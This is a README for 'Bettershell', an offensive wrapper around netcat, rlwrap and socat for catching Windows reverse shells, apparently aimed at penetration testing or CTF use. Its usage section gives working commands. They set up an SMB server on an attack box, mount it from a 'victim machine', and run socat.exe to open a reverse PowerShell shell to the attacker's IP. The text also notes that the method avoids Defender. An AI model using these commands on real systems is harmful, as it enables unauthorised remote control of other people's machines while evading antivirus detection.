# Bettershell
Bettershell is a basic netcat client, supercharged with rlwrap, socat, a large Powershell command wordlist, and bash scripting.

### Features:
* Shells won't die on CTRL+C
* Preset tab autocomplete based on a Windows command list
* Filesystem-learning tab autocomplete, thanks to rlwrap's smart output parser
* Working arrowkey movement
* Searchable command history with CTRL+R
* An accurate path prompt
* No double echo of commands
* It's blue! Is it really powershell if it isn't blue?

Although bettershell can be used to catch any reverse shell from a Windows box, the included 'socat.exe' binary is strongly recommended to properly pipe stderr messages to your listener; visible error messages are invaluable when privilege-escalating.
## Usage

Open port 445, then start up an impacket SMB server on your attack box in the same directory as socat.exe:
```
sudo smbserver.py SMB . -comment SMB -ts -debug -smb2support -username user -password pass
```
Start a listener in another window: ```./bettershell -nlvp yourPORT```

Lastly, execute the following on the victim machine:
```
cmd.exe /c net use x: \\yourIP\SMB /user:user pass & x:\socat.exe tcp-connect:yourIP:yourPORT exec:powershell.exe,pty,stderr
```
The above example shouldn't trigger Defender. Exclude authentication when attacking older PCs that don't support it.
